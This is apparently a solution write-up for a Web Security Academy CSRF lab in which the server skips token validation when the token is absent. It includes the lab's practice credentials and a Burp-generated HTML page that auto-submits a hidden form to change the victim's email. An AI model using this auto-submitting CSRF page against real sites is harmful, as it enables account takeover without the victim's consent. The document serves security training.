
# CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

In this case the default POST request to change the email contains a parameter “csrf”, but it works if you send only the email and no CSRF token:

Clicking "Engagement tools" > "Generate CSRF PoC", it generates an HTML PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a27008804d6685d8057df8500ab003c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test4&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
